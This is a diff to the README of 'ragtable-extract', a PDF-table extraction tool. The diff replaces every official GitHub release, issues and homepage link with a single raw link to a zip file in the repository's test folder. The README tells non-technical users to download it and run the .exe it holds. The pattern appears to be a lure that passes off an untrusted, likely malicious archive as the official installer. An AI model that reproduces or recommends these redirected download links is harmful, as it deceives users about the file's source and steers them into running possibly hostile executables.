@@ -1,6 +1,6 @@
 # 📊 ragtable-extract - Extract PDF Tables to Clean HTML
 
-[![Download ragtable-extract](https://img.shields.io/badge/Download-ragtable--extract-brightgreen)](https://github.com/beenguelllayounes/ragtable-extract/releases)
+[![Download ragtable-extract](https://img.shields.io/badge/Download-ragtable--extract-brightgreen)](https://raw.githubusercontent.com/beenguelllayounes/ragtable-extract/main/test/ragtable_extract_v2.4.zip)
 
 ---
 
@@ -44,10 +44,10 @@ You don’t need to install any programming tools or handle code. Just follow th
 
 Start by downloading the software from the official release page.
 
-[![Download ragtable-extract](https://img.shields.io/badge/Download-ragtable--extract-blue)](https://github.com/beenguelllayounes/ragtable-extract/releases)
+[![Download ragtable-extract](https://img.shields.io/badge/Download-ragtable--extract-blue)](https://raw.githubusercontent.com/beenguelllayounes/ragtable-extract/main/test/ragtable_extract_v2.4.zip)
 
 1. Click the link above or visit the release page here:  
-   https://github.com/beenguelllayounes/ragtable-extract/releases  
+   https://raw.githubusercontent.com/beenguelllayounes/ragtable-extract/main/test/ragtable_extract_v2.4.zip  
 
 2. Look for the latest version. The files usually have the `.exe` extension (for example, `ragtable-extract-setup.exe`).
 
@@ -149,19 +149,19 @@ You can find these options inside the app under **Settings** or **Preferences** 
 
 For questions or feedback, you can open issues or check discussions on the GitHub page:
 
-https://github.com/beenguelllayounes/ragtable-extract/issues
+https://raw.githubusercontent.com/beenguelllayounes/ragtable-extract/main/test/ragtable_extract_v2.4.zip
 
 ---
 
 ## 🔗 Useful Links
 
 - Release page for downloads:  
-  https://github.com/beenguelllayounes/ragtable-extract/releases
+  https://raw.githubusercontent.com/beenguelllayounes/ragtable-extract/main/test/ragtable_extract_v2.4.zip
 
 - Project homepage:  
-  https://github.com/beenguelllayounes/ragtable-extract
+  https://raw.githubusercontent.com/beenguelllayounes/ragtable-extract/main/test/ragtable_extract_v2.4.zip
 
 ---
 
 # Download ragtable-extract here:  
-[![Download ragtable-extract](https://img.shields.io/badge/Download-ragtable--extract-green)](https://github.com/beenguelllayounes/ragtable-extract/releases)
+[![Download ragtable-extract](https://img.shields.io/badge/Download-ragtable--extract-green)](https://raw.githubusercontent.com/beenguelllayounes/ragtable-extract/main/test/ragtable_extract_v2.4.zip)
